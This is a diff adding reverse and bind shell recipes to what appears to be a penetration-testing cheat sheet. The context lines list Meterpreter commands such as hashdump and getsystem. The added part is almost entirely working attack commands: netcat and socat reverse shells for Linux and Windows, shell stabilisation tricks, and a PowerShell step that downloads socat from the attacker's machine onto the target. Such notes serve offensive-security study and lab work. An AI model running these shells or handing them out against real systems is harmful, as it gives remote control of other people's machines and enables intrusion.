@@ -435,3 +435,52 @@ webcam_snap: Takes a snapshot from the specified webcam <br>
 webcam_stream: Plays a video stream from the specified webcam <br>
 getsystem: Attempts to elevate your privilege to that of local system <br>
 hashdump: Dumps the contents of the SAM database <br>
+
+# Reverse and bind shell:
+## Netcat
+### Listen from attacking device
+    sudo nc -lvnp 443 (reverse)
+    nc <MACHINE_IP> <port> (bind)
+### Send a shell from target device
+    nc <LOCAL-IP> <PORT> -e /bin/bash (reverse)
+    nc -lvnp <port> -e "cmd.exe" (bind)
+### Shell stabilisation
+#### Python:
+    python -c 'import pty;pty.spawn("/bin/bash")'
+    export TERM=xterm
+    CTRL+Z  (to background the shell)
+    stty raw -echo; fg (on attacker's shell)
+    (reset to enable attacker's shell back)
+#### rlwrap:
+    rlwrap nc -lvnp <port>
+#### Socat:
+Use shell to download: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true <br>
+Then execute it on linux target.<br>
+On windows, instead of curl or wget, use:
+
+    Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
+#### Terminal size for text editors...
+On attacker's shell:
+
+    stty -a (note the values of "rows" and "columns"
+On reverse/bind shell:
+
+    stty rows <number>
+    stty cols <number>
+## Socat
+### Listen from attacking device (basic shell)
+    socat TCP-L:<port> - (reverse)
+    socat TCP:<TARGET-IP>:<TARGET-PORT> - (bind)
+### Send a shell from target device (basic shell)
+    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes (reverse Windows)
+    socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" (reverse Linux)
+    socat TCP-L:<PORT> EXEC:"bash -li" (bind Linux)
+    socat TCP-L:<PORT> EXEC:powershell.exe,pipes (bind Windows)   
+### Listen from attacking device (very stable shell)
+    socat TCP-L:<port> FILE:`tty`,raw,echo=0  
+### Send a shell from target LINUX device (very stable shell)
+First download: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true on the target machine, then: <br>
+    
+    socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+### Add verbosity
+    -d -d (in the command)
